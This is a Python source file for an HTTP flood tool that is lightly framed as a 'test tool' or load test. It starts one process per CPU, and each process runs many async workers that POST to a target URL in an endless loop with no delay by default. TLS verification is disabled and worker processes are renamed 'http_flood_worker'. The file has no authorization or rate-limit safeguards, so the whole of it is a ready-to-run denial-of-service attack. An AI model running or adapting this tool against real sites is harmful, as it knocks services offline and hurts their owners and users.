import asyncio
import multiprocessing
import os
import platform
import random
import socket
import ssl
import sys
import time
import argparse


from typing import Optional, Dict, Any
from contextlib import suppress


import psutil
import uvloop
from aiohttp import ClientSession, TCPConnector
from rich import traceback

from .src.headres import getHeaders
from .utils.ulog import log, log_off, log_on





traceback.install()


# Configurations 
# =========================
SOCK_BUFF_SIZE = 1024 * 1204
MAX_HTTP_PACKET_SIZE = 16 * 1024 * 1024
DEFAULT_CONCURRENT_WORKERS =  multiprocessing.cpu_count()


asyncio.set_event_loop_policy(uvloop.EventLoopPolicy())

#  CLASSES

class CPUManager:
    @staticmethod
    def randomize_cpu() -> None:
        current_pid = os.getpid()


        if platform.system().lower() == "linux":
            log.warning(f"cpu affinity setting on linux (currnt: {platform.system()})")
            return
        
        try:
            cpu_count = os.cpu_count()

            if not cpu_count:
                log.error("Unable to determine CPU count.")
                return
            
            cpu_ids = list(range(cpu_count))
            log.warning(f"Available CPUs: {cpu_ids}")

            os.sched_setaffinity(current_pid, cpu_ids)

            log.info(f"Set CPU affinity for PID {current_pid} to CPUs: {cpu_ids}")

        except (AttributeError, OSError) as e:
            log.error(f"Failed to set CPU affinity: {e}")




class HTTPFlooder:
    def __init__(
            self,
            target_url: str,
            concurrency: int,
            sleep_time: float
    ):
        self.target_url = target_url
        self.concurrency = concurrency
        self.sleep_time = sleep_time

        self.session : Optional[ClientSession] = None
        self.ssl_context = self.create_ssl_context()


    def create_ssl_context(self) -> ssl.SSLContext:
        context = ssl.create_default_context()
        context.check_hostname = False
        context.verify_mode = ssl.CERT_NONE

        context.options |= ssl.OP_NO_COMPRESSION # ?
        return context


    async def __aenter__(self):
        headers = getHeaders(self.target_url)
        connector = TCPConnector(
            limit=self.concurrency * 2,
            limit_per_host=self.concurrency,
            ssl=self.ssl_context,
            use_dns_cache=True,
            ttl_dns_cache=300,
            keepalive_timeout=30,
        )


        self.session = ClientSession(
            headers=headers,
            connector=connector,
            trust_env=True,
        )
        return self
    

    async def __aexit__(self, 
                        exc_type,
                        exc_val,
                        exc_tb):
        if self.session:
            await self.session.close()


    # :)
    async def send_http_request(
            self,
            worker_id: int,
            sem: asyncio.Semaphore
    ) -> None:
        pid = os.getpid()

        while True:
            async with sem:
                try:
                    if not self.session:
                        raise RuntimeError("HTTP session is not initialized.")
                    async with self.session.post(
                        self.target_url
                    ) as response:
                        await response.read()

                        if response.status >= 400:
                            log.info(f"[Worker {worker_id} | PID {pid}] Received error status code: {response.status}")
                        else:
                            log.info(f"[Worker {worker_id} | PID {pid}] Sent HTTP request successfully. Status code: {response.status}")
                    if self.sleep_time >0:
                        await asyncio.sleep(self.sleep_time)

                except asyncio.CancelledError:
                    log.info(f"[Worker {worker_id} | PID {pid}] Task was cancelled.")
                    break
                except Exception as e:
                    log.error(f"[Worker {worker_id} | PID {pid}] Error sending HTTP request: {e}")
                    await asyncio.sleep(
                        min(5, self.sleep_time +1)
                    )

async def run_http_flood(
        target_url: str,
        concurrency: int,
        sleep_time: float
) -> None:
    log.warning(f"Starting HTTP flood on {target_url} with {concurrency} workers.")

    CPUManager.randomize_cpu()


    async with HTTPFlooder(
        target_url,
        concurrency,
        sleep_time
    ) as flooder:
        sem = asyncio.Semaphore(concurrency)

        tasks = [
            asyncio.create_task(
                flooder.send_http_request(
                    worker_id=i,
                    sem=sem
                ),
                name=f"http_worker_{i}"
            )
            for i in range(concurrency)
        ]


        try:
            await asyncio.gather(*tasks, return_exceptions=True)
        except KeyboardInterrupt:
            log.warning("Received exit signal. Cancelling tasks...")
            for task in tasks:
                task.cancel()

            with suppress(
                asyncio.CancelledError
            ):
                await asyncio.gather(*tasks, return_exceptions=True)



def create_argument_parser() -> argparse.ArgumentParser:
    parser = argparse.ArgumentParser(
        description="test tool",
        usage="%(prog)s -t <target_url> -tr <thread_count> -n <sleep_time>"
    )


    parser.add_argument(
        "-t", "--target_url",
        type=str,
        required=True,
        help="Target URL to flood (e.g., http://example.com)"
    )

    parser.add_argument(
        "-tr", "--thread_count", 
        type=int, 
        default=DEFAULT_CONCURRENT_WORKERS,
        help=f"Number of threads/processes (default: CPU count = {DEFAULT_CONCURRENT_WORKERS})"
    )

    parser.add_argument(
        "-n", "--sleep_time", 
        type=float, 
        default=0,
        help="Sleep time between requests in seconds (default: 0)"
    )
    parser.add_argument(
        "-c", "--concurrency",
        type=int,
        default=50,
        help="Concurrent requests per worker (default: 50)"
    )
    
    return parser


def validate_arguments(args: argparse.Namespace) -> bool:
    """Validate command line arguments"""
    if not args.target_url.startswith(('http://', 'https://')):
        print("Error: Target URL must start with http:// or https://")
        return False
        
    if args.thread_count <= 0:
        print("Error: Thread count must be positive")
        return False
        
    if args.concurrency <= 0:
        print("Error: Concurrency must be positive")
        return False
        
    if args.sleep_time < 0:
        print("Error: Sleep time cannot be negative")
        return False
        
    return True


def worker_process(
        target_url: str,
        concurrency: int,
        sleep_time: float
) -> None:
    try:
        if platform.system().lower() == "linux":
            import ctypes
            libc = ctypes.cdll.LoadLibrary("libc.so.6")
            libc.prctl(15, b'http_flood_worker', 0, 0, 0)

        asyncio.run(
            run_http_flood(
                target_url,
                concurrency,
                sleep_time
            )
        )

    except KeyboardInterrupt:
        log.warning("Worker process received exit signal. Exiting...")
    except Exception as e:
        log.error(f"Worker process encountered an error: {e}")



def main() -> None:
    parser = create_argument_parser()
    args = parser.parse_args()


    if not validate_arguments(args):
        sys.exit(1)

    print(f"""
    Starting Load Test Configuration:
    - Target URL: {args.target_url}
    - Processes: {args.thread_count}
    - Concurrency per process: {args.concurrency}
    - Sleep time: {args.sleep_time}s
    - Total workers: {args.thread_count * args.concurrency}
    """)

    processes = []

    try:
        for i in range(args.thread_count):
            p = multiprocessing.Process(
                target=worker_process,
                args=(
                    args.target_url,
                    args.concurrency,
                    args.sleep_time
                ),
                name=f"flood_worker_{i}"
            )
            processes.append(p)
            p.start()
            log.info(f"Started process {i+1}/{args.thread_count}: {p.name} with PID {p.pid}")


        for p in processes:
            p.join()

    except KeyboardInterrupt:
        log.warning("\nReceived exit signal. Terminating processes...")

        for p in processes:
            if p.is_alive():
                log.info(f"Terminating process {p.name} with PID {p.pid}")
                p.terminate()
        
        for p in processes:
            p.join(timeout=5)


        log.info("All processes terminated. Exiting.")


    except Exception as e:
        log.error(f"Main process encountered an error: {e}")
        sys.exit(1) 


